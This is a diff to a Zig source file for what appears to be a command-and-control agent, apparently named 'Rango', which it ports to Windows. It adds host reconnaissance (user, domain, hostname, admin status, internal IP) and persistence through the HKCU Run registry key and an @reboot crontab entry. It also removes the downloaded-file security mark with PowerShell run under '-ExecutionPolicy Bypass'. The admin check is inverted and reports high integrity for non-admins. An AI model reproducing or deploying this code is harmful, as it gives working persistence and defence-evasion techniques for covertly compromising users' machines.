@@ -1,8 +1,10 @@
 const std = @import("std");
+const builtin = @import("builtin");
 const crypto = std.crypto;
 const base64 = std.base64;
 const time = std.time;
 const Allocator = std.mem.Allocator;
+extern "shell32" fn IsUserAnAdmin() callconv(.winapi) bool;
 
 pub const SystemInfo = struct {
     allocator: Allocator,
@@ -14,34 +16,72 @@ pub const SystemInfo = struct {
     }
     
     pub fn getCurrentUser(self: *SystemInfo) ![]const u8 {
-        const result = std.posix.getenv("USER") orelse
-            return try self.allocator.dupe(u8, "unknown");
-        
-        return try self.allocator.dupe(u8, result);
+        const key = if (builtin.os.tag == .windows) "USERNAME" else "USER";
+        // Using getEnvVarOwned since the windows API is killing me
+        return std.process.getEnvVarOwned(self.allocator, key) catch |err| {
+            if (err == error.EnvironmentVariableNotFound) {
+                return self.allocator.dupe(u8, "unknown");
+            }
+            return err;
+        };
     }
     
     pub fn getHostname(self: *SystemInfo) ![]const u8 {
-        var hostname_buf: [64]u8 = undefined;
-        const result = std.posix.gethostname(&hostname_buf) catch "Unknown";
-        
-        return try self.allocator.dupe(u8, result);
+        if (builtin.os.tag == .windows) {
+            return std.process.getEnvVarOwned(self.allocator, "COMPUTERNAME") catch |err| {
+                if (err == error.EnvironmentVariableNotFound) {
+                    return self.allocator.dupe(u8, "Unknown");
+                }
+                return err;
+            };
+        } else {
+            var hostname_buf: [64]u8 = undefined;
+                const result = std.posix.gethostname(&hostname_buf) catch "Unknown";
+            return try self.allocator.dupe(u8, result);
+        }
     }
     
     pub fn getPid(self: *SystemInfo) ![]const u8 {
-        const pid = std.os.linux.getpid();
-        return try std.fmt.allocPrint(self.allocator, "{d}", .{pid});
+        if (builtin.os.tag == .windows) {
+            const pid = std.os.windows.GetCurrentProcessId();
+            return try std.fmt.allocPrint(self.allocator, "{d}", .{pid});
+        } else {
+            const pid = std.os.linux.getpid();
+            return try std.fmt.allocPrint(self.allocator, "{d}", .{pid});
+        }
     }
     
     pub fn getDomain(self: *SystemInfo) ![]const u8 {
-        return try self.allocator.dupe(u8, "WORKGROUP"); // Default
+        if (builtin.os.tag == .windows) {
+            return std.process.getEnvVarOwned(self.allocator, "USERDOMAIN") catch |err| {
+                if (err == error.EnvironmentVariableNotFound) {
+                    return try self.allocator.dupe(u8, "WORKGROUP");
+                }
+                return err;
+            };
+        } else {
+            return try self.allocator.dupe(u8, "WORKGROUP"); // Default
+        }
     }
     
     pub fn getIntegrityLevel(self: *SystemInfo) ![]const u8 {
-        const euid = std.os.linux.geteuid();
-        if (euid == 0) {
-            return try self.allocator.dupe(u8, "4"); //high integrity to mean process is running as root
+        if (builtin.os.tag == .windows) {
+            //Windows docs encourage using something else but who has time for that?
+            //This function is a wrapper for CheckTokenMembership.
+            //It is recommended to call that function directly to determine
+            //Administrator group status rather than calling IsUserAnAdmin
+            if (IsUserAnAdmin() != true) {
+                return try self.allocator.dupe(u8, "4"); //high integrity
+            } else {
+                return try self.allocator.dupe(u8, "1"); //low integrity
+            }
         } else {
-            return try self.allocator.dupe(u8, "1"); //low integrity, process is normal user.
+            const euid = std.os.linux.geteuid();
+            if (euid == 0) {
+                return try self.allocator.dupe(u8, "4"); //high integrity to mean process is running as root
+            } else {
+                return try self.allocator.dupe(u8, "1"); //low integrity, process is normal user.
+            }
         }
     }
     
@@ -50,20 +90,45 @@ pub const SystemInfo = struct {
     }
     
     pub fn getInternalIP(self: *SystemInfo) ![]const u8 {
-        //we are going to run hostname -I and return the first IP address. I don't wanna use c library for this.
-        const result = std.process.Child.run(.{
-            .allocator = self.allocator,
-            .argv = &.{ "hostname", "-I" },
-        }) catch |err| {
-            std.debug.print("{}\n", .{err});//I should fix this later
-            return try self.allocator.dupe(u8, "127.0.0.1");
-        };
-        var tokens = std.mem.splitAny(u8, result.stdout, " ");
-        const first_ip = tokens.first();
-        if (first_ip.len == 0) {
-            return try self.allocator.dupe(u8, "127.0.0.1");
+        if (builtin.os.tag == .windows) {
+            const result = std.process.Child.run(.{
+                .allocator = self.allocator,
+                .argv = &.{ "ipconfig" },
+            }) catch |err| {
+                std.debug.print("{}\n", .{err});
+                return try self.allocator.dupe(u8, "127.0.0.1");
+            };
+            var tokens = std.mem.splitAny(u8, result.stdout, "\n");
+            const first_ip = tokens.first();
+            while (tokens.next()) |line| {
+                if (std.mem.indexOf(u8, line, "IPv4 Address") != null) {
+                    const ip_start = std.mem.indexOf(u8, line, ":") orelse continue;
+                    const ip_str = std.mem.trim(u8, line[ip_start + 1 ..], " \t\r\n");
+                    if (ip_str.len > 0 and std.mem.indexOf(u8, ip_str, ".") != null) {
+                        return try self.allocator.dupe(u8, ip_str);
+                    }
+                }
+            }
+            if (first_ip.len == 0) {
+                return try self.allocator.dupe(u8, "127.0.0.1");
+            }
+            return try self.allocator.dupe(u8, first_ip);
+        } else {
+            //we are going to run hostname -I and return the first IP address. I don't wanna use c library for this.
+            const result = std.process.Child.run(.{
+                .allocator = self.allocator,
+                .argv = &.{ "hostname", "-I" },
+            }) catch |err| {
+                std.debug.print("{}\n", .{err});//I should fix this later
+                return try self.allocator.dupe(u8, "127.0.0.1");
+            };
+            var tokens = std.mem.splitAny(u8, result.stdout, " ");
+            const first_ip = tokens.first();
+            if (first_ip.len == 0) {
+                return try self.allocator.dupe(u8, "127.0.0.1");
+            }
+            return try self.allocator.dupe(u8, first_ip);
         }
-        return try self.allocator.dupe(u8, first_ip);
     }
     
     pub fn getProcessName(self: *SystemInfo) ![]const u8 {
@@ -180,72 +245,144 @@ pub const TimeUtils = struct {
 
 pub const PersistUtils = struct {
     pub fn install_cron(agent_path: []const u8, allocator: std.mem.Allocator) !void {
-        const existing = std.process.Child.run(.{
-            .allocator = allocator,
-            .argv = &.{ "crontab", "-l" },
-            .max_output_bytes = 8192,
-        }) catch |err| {
-            // proceed with empty if none exists(crontab)
-            if (err == error.ChildExecFailed) {
-                return error.CrontabNotAvailable;
+        if (builtin.os.tag == .windows) {
+            const existing = try std.process.Child.run(.{
+                .allocator = allocator,
+                .argv = &.{
+                    "reg.exe",
+                    "query",
+                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/v",
+                    "Rango",
+                },
+            });
+
+            const reg_exists = existing.term.Exited == 0;
+            if (reg_exists and std.mem.indexOf(u8, existing.stdout, agent_path) != null) {
+                return error.AlreadyPersistent;
             }
-            return err;
-        };
-        const cron_line = try std.fmt.allocPrint(allocator, "@reboot {s} &\n", .{agent_path});
-        defer allocator.free(cron_line);
 
-        if (std.mem.indexOf(u8, existing.stdout, agent_path) != null) {
-            return; // already persistent
-        }
-        const combined = try std.mem.concat(allocator, u8, &[_][]const u8{ existing.stdout, cron_line });
-        defer allocator.free(combined);
+            const unblock_cmd = try std.fmt.allocPrint(
+                allocator,
+                "Unblock-File -Path \"{s}\"",
+                .{agent_path});
+            defer allocator.free(unblock_cmd);
+            const remove_motw = try std.process.Child.run(.{
+                .allocator = allocator,
+                .argv = &.{
+                    "powershell",
+                    "-NoProfile",
+                    "-ExecutionPolicy",
+                    "Bypass",
+                    "-Command",
+                    unblock_cmd
+                },
+            });
 
-        var write_proc = std.process.Child.init(&[_][]const u8{"crontab", "-"}, allocator);
-        write_proc.stdin_behavior = .Pipe;
-        try write_proc.spawn();
+            if (remove_motw.term.Exited != 0) {
+                return error.UnblockFileFailed;
+            }
+            const result = try std.process.Child.run(.{
+                .allocator = allocator,
+                .argv = &.{
+                    "reg.exe",
+                    "add",
+                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/v", "Rango",
+                    "/d", try std.fmt.allocPrint(allocator, "\"{s}\"", .{agent_path}),
+                    "/f",
+                },
+            });
 
-        if (write_proc.stdin) |stdin| {
-            try stdin.writeAll(combined);
-            stdin.close();
-        }
+            if (result.term.Exited != 0) {
+                return error.RegistryWriteFailed;
+            }
+
+        } else {
+
+            const existing = std.process.Child.run(.{
+                .allocator = allocator,
+                .argv = &.{ "crontab", "-l" },
+                .max_output_bytes = 8192,
+            }) catch |err| {
+                // proceed with empty if none exists(crontab)
+                if (err == error.ChildExecFailed) {
+                    return error.CrontabNotAvailable;
+                }
+                return err;
+            };
+            const cron_line = try std.fmt.allocPrint(allocator, "@reboot {s} &\n", .{agent_path});
+            defer allocator.free(cron_line);
+
+            if (std.mem.indexOf(u8, existing.stdout, agent_path) != null) {
+                return; // already persistent
+            }
+            const combined = try std.mem.concat(allocator, u8, &[_][]const u8{ existing.stdout, cron_line });
+            defer allocator.free(combined);
+
+            var write_proc = std.process.Child.init(&[_][]const u8{"crontab", "-"}, allocator);
+            write_proc.stdin_behavior = .Pipe;
+            try write_proc.spawn();
+
+            if (write_proc.stdin) |stdin| {
+                try stdin.writeAll(combined);
+                stdin.close();
+            }
 
          // _ = write_proc.wait() catch |err| {
          //   std.log.err("Failed to write crontab: {}", .{err});
          //   return error.CrontabWriteFailed; // Should handle this properly because of a panic in my tests:(
         //};
+        }
     }
     pub fn remove_cron_entry(agent_path: []const u8, allocator: std.mem.Allocator) !void {
-        const existing = std.process.Child.run(.{
-            .allocator = allocator,
-            .argv = &.{ "crontab", "-l" },
-            .max_output_bytes = 8192,
-        }) catch |err| {
-            if (err == error.ChildExecFailed) return; // nothing to remove no crontab
-            return err;
-        };
-        var list = std.ArrayList([]const u8){};
-        defer list.deinit(allocator);
+        if (builtin.os.tag == .windows) {
+            const existing = try std.process.Child.run(.{
+                .allocator = allocator,
+                .argv = &.{
+                    "reg.exe",
+                    "delete",
+                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    "/v",
+                    "Rango",
+                    "/f"
+                },
+            });
+            if (existing.term.Exited != 0) {
+                return error.RegistryDeleteFailed;
+            }
+        } else {
+            const existing = std.process.Child.run(.{
+                .allocator = allocator,
+                .argv = &.{ "crontab", "-l" },
+                .max_output_bytes = 8192,
+            }) catch |err| {
+                if (err == error.ChildExecFailed) return; // nothing to remove no crontab
+                return err;
+            };
+            var list = std.ArrayList([]const u8){};
+            defer list.deinit(allocator);
 
-        // Split into lines and filter out any containing our agent path
-        var it = std.mem.splitAny(u8, existing.stdout, "\n");
-        while (it.next()) |line| {
-            if (std.mem.indexOf(u8, line, agent_path) == null and line.len > 0) {
-                try list.append(allocator, line);
+            // Split into lines and filter out any containing our agent path
+            var it = std.mem.splitAny(u8, existing.stdout, "\n");
+            while (it.next()) |line| {
+                if (std.mem.indexOf(u8, line, agent_path) == null and line.len > 0) {
+                    try list.append(allocator, line);
+                }
+            }
+            const filtered = try std.mem.join(allocator, "\n", list.items);
+            defer allocator.free(filtered);
+
+            var write_proc = std.process.Child.init(&[_][]const u8{"crontab", "-"}, allocator);
+            write_proc.stdin_behavior = .Pipe;
+            try write_proc.spawn();
+
+            if (write_proc.stdin) |stdin| {
+                try stdin.writeAll(filtered);
+                try stdin.writeAll("\n");
+                stdin.close();
             }
         }
-        const filtered = try std.mem.join(allocator, "\n", list.items);
-        defer allocator.free(filtered);
-
-        var write_proc = std.process.Child.init(&[_][]const u8{"crontab", "-"}, allocator);
-        write_proc.stdin_behavior = .Pipe;
-        try write_proc.spawn();
-
-        if (write_proc.stdin) |stdin| {
-            try stdin.writeAll(filtered);
-            try stdin.writeAll("\n");
-            stdin.close();
-        }
-
         //_ = write_proc.wait() catch {};//line caused a panic in my tests, commenting out for now
     }
 
